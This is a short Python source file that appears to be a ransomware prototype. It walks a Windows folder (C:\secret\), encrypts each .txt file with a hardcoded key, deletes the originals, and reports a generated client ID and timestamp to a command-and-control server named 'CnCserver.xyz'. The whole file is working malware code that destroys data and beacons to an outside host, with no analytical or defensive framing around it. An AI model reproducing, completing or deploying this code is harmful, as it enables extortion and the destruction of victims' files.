import os 
import random
import struct
import smtplib
import string
import datetime
import time
import requests
from multiprocessing import Pool
from simplecrypt import encrypt, decrypt

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

ID = ''
files_to_enc = []
key = "PASSWORD"

def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
    global ID
    ID = ''.join(random.choice(chars) for _ in range(size))


def send_ID_Key():
    ts = datetime.datetime.now()
    SERVER = "CnCserver.xyz"         
    PORT = 80                        
    url = "index?Date="+str(ts)+"&ClientID="+str(ID)
    full_url = "http://"+SERVER+"/"+url
    try:              
        r=requests.get(full_url)
        #urllib2.urlopen(full_url).read()
    except Exception as e:
        # print e
        pass
    
def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    print in_filename
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    """ Old method
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            #outfile.write(struct.pack('<Q', filesize))
            #outfile.write(iv)
            while True:
                chunk = infile.read()
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))
    """
    filesize = os.path.getsize(in_filename)
    with open(in_filename,'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            ciphertext = encrypt(key,infile.read())
            outfile.write(ciphertext)
        

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def selectfiles():
    files_to_enc = []
    for root, dirs, files in os.walk("C:\\secret\\"):
        for file in files:
            if file.endswith(".txt"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
    send_ID_Key()

pool = Pool(processes=4)
#pool.map(single_arg_encrypt_file, files_to_enc)
selectfiles()
